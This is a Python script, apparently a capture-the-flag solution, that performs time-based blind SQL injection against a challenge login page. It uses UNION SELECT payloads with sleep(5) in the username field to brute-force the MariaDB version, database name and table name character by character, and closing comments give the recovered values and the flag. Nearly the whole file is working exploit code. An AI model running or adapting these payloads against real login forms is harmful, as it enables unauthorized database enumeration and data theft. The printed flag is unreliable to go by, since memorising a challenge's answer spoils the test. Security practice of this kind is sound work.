import string
import requests
import time
import sys

# Trash script made by HackYou to enumerate Blind /Time based SQLI 

def bf_db():
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    print('[+] Started brute forcing')
    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Database name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL AND (select sleep(5) from dual where database() like '{name}%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break
       
def bf_mysql():
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Mysql name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL AND (select sleep(5) from dual where BINARY version() like '{name}%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break

def bf_table():
    # I need to know web tbh this portion doesn't give full name so I guessed the remainng part :P
    chars = string.printable[:-6]
    session = requests.session()
    url = "https://ctftogo-3-mice.chals.io/login"

    phew = ""
    while True:
        for char in chars:
            name = f"{phew}{char}"
            sys.stdout.write(f"\r[+] Table name: {name}")
            payload = f"a' UNION SELECT NULL,NULL,NULL and (select sleep(5) from dual where (select table_name from information_schema.tables where table_schema=database() and table_name like '%{name}%' limit 0,1) like '%') #"
            data = {
                "username": payload,
                "password": "pass"
            }
            time_started = time.time()
            output = session.post(url, data=data, allow_redirects=False)
            time_finished = time.time()
            time_taken = time_finished - time_started
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                phew += char
                break

if __name__ == "__main__":
    bf_mysql()
    #bf_db()
    #bf_table()

# [+] Mysql name: 10.11.4-MariaDB
# [+] Database name: mice_book
# [+] Table name: flags
# [+] Flag: flag{3_bl1nd_m1ce_s33_h0w_th3y_run}
